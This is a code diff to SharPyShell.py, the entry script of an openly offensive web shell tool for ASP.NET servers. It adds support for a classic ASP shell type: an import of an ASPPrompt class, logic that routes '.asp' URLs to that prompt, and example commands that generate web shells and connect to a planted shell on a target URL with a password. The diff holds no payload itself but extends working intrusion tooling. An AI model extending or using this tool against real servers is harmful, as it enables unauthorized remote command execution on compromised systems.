@@ -2,6 +2,7 @@
 
 from core.Generate import Generate
 from core.SharPyShellPrompt import SharPyShellPrompt
+from core.ASPPrompt import ASPPrompt
 from core import config
 import argparse
 
@@ -13,7 +14,8 @@ examples:
     python SharPyShell.py generate -p 'somepassword' -f asmx --no-obfuscate
     python SharPyShell.py generate -p 'somepassword' -f asp
     python SharPyShell.py interact -u 'http://target.url/sharpyshell.aspx' -p 'somepassword'
-    python SharPyShell.py interact -u 'http://target.url/handler.ashx' -p 'somepassword'
+    python SharPyShell.py interact -u 'http://target.url/handler.ashx'  -p 'somepassword'
+    python SharPyShell.py interact -u 'http://target.url/sharpyshell.asp' -p 'somepassword'
 '''
 
 
@@ -189,8 +191,13 @@ if __name__ == '__main__':
             generate_obj.generate()
 
         if args.mode == 'interact':
-            prompt = SharPyShellPrompt(args.password, args.encryption, args.default_shell, args.url,
-                                       args.user_agent, args.cookies, args.custom_header, args.insecure, args.proxy)
+            if args.url.rstrip('/').lower().endswith('.asp'):
+                prompt = ASPPrompt(args.password, args.url,
+                                   args.user_agent, args.cookies,
+                                   args.custom_header, args.insecure, args.proxy)
+            else:
+                prompt = SharPyShellPrompt(args.password, args.encryption, args.default_shell, args.url,
+                                           args.user_agent, args.cookies, args.custom_header, args.insecure, args.proxy)
             prompt.cmdloop('\n')
     else:
         parser.print_help()
